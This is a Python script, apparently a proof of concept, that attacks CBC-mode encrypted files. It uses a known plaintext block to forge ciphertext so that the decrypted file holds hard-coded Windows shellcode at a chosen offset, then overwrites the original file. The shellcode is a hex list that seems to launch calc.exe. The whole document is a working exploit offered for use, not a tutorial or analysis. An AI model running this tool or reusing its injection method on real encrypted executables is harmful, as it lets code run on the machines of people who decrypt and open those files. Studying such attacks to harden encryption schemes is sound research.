#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, binascii
block_size = IV_size = 0x10

def calc_X(C1, known_plain):
    return format(int(C1, 16) ^ int(known_plain, 16), 'x').zfill(block_size * 2)

def construct_c_prime(X, Mtarget):
    return binascii.unhexlify(format(int(X, 16) ^ int(Mtarget, 16), 'x').zfill(block_size * 2))

def padding(s, pad):
    return binascii.hexlify(pad).zfill(2) * (block_size - len(binascii.unhexlify(s)))

def adjust_shell(Mtargets, mod):
    for i in range(len(Mtargets)):
        m = Mtargets[i]
        m += padding(m, b'\x90')
        Mtargets[i] = m
    if mod == 15:
        print("[-] Too small space to inject the first snippet of the shellcode")
        quit()
    if mod > 0:
        snippet = b"90" * (block_size - mod - 2) + b"eb10"
        Mtargets.insert(0, snippet)
    return Mtargets

def main(argv):
    if len(argv) != 2:
        print("[-] Usage:\n\t$ %s [encrypted file]" % argv[0])
        quit()

    try:
        f = open(argv[1], 'rb')
        content = f.read()
        f.close()
    except IOError:
        print("[-] Failed to open the file.")
        quit()

    try:
        entry_point = int(input("The location to inject: "), 16)
    except ValueError:
        print("[-] Input hex value. e.g., 0x4f0")
        quit()

    # The second block is fixed value (32- and 64-bit)
    M2hex = b"B8000000000000004000000000000000"
    C1hex = content[IV_size:IV_size+block_size]
    Y1 = content[IV_size+block_size:IV_size+block_size*2]  # The second correspond cipher block
    # Polyglot shellcode for Windows (32- and 64-bit)
    Mtargets = [b"31c0409085c00f85f4020000eb12", b"fc4883e4f0e80202000041514150eb10", b"5251564831d265488b5260eb13", b"488b5218488b5220488b7250eb12", b"480fb74a4a4d31c94831c0ac3c61eb10", b"7c022c2041c1c90d4101c1e2db52eb10", b"4151488b52208b423c4801d0eb12", b"8b80880000004885c0eb15", b"0f841b0100004801d0508b4818eb11", b"448b40204901d04889c84885c0eb11", b"0f84da00000048ffc9418b3488eb11", b"4801d64d31c94831c0ac41c1c90deb10", b"4101c138e075df4c034c2408eb12", b"4539d1758258448b40244901d0eb11", b"66418b0c48448b401c4901d0eb12", b"418b04884801d0415841585e595aeb10", b"41584159415a4883ec204152ffe0eb10", b"5841595a488b12e93cfeffff5deb11", b"48ba0100000000000000eb14", b"488d8db802000041ba318b6f87eb11", b"ffd5bbf0b5a25641baa695bd9deb11", b"ffd54883c4283c067c0a80fbe0eb11", b"7505bb4713726f6a00594189daeb11", b"ffd563616c632e65786500", b"31db648b7b308b7f0c8b7f1ceb12", b"8b47088b77208b3f807e0c3375f2eb10", b"89c703783c8b577801c28b7a20eb11", b"01c789dd8b34af01c645eb14", b"813e4372656175dceb16", b"817e086f63657375bb8b7a2401c7eb10", b"668b2c6f8b7a1c01c78b7caffceb11", b"01c789d9b1ff53e2fd6863616c63eb10", b"89e252525353535353535253ffd7"]

    # In case the starting address isn't aligned by 16 bytes
    mod = entry_point % block_size
    Mtargets = adjust_shell(Mtargets, mod)

    IV = content[:IV_size]
    skip = content[IV_size:IV_size+entry_point-mod-0x10]
    rest = content[IV_size+entry_point-mod+len(Mtargets)*0x20-0x10:]

    X1 = calc_X(binascii.hexlify(C1hex), M2hex)
    payload = IV + skip

    for m in Mtargets:
        payload += construct_c_prime(X1, m)
        payload += Y1
    payload += rest

    f = open(argv[1], 'wb')
    f.write(payload)
    f.close()

if __name__ == '__main__':
    main(sys.argv)
